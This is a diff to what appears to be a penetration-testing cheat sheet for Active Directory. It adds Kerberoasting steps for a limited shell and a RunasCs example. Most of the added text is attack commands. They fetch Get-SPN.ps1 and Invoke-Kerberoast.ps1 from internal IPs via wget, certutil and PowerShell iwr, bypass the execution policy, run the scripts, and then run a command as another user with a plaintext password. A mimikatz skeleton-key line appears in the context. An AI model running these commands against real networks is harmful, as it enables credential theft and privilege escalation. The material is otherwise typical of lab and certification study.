@@ -407,6 +407,30 @@ misc::skeleton
 net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz
 ```
 
+## Limited Shell Kerberoasting
+```
+wget https://github.com/compwiz32/PowerShell/blob/master/Get-SPN.ps1?source=post_page-----b95d3146cfe9--------------------------------
+certutil -urlcache -split -f http://192.168.x.x/Get-SPN.ps1
+powershell -ExecutionPolicy Bypass
+.\Get-SPN.ps1
+```
+```
+powershell iwr http://192.168.45.154/Invoke-Kerberoast.ps1 -outfile Invoke-Kerberoast.ps1
+.\Invoke-Kerberoast.ps1
+```
+
+## RunAs in CLI
+Reference: https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1?source=post_page-----b95d3146cfe9--------------------------------
+```
+Import-Module .\Invoke-RunasCs.ps1
+Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "whoami"
+
+```
+
+![image](https://github.com/user-attachments/assets/80e5d070-10d8-4ab7-be5b-149936e3a6da)
+
+
+
 > The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques.
 
 ## References
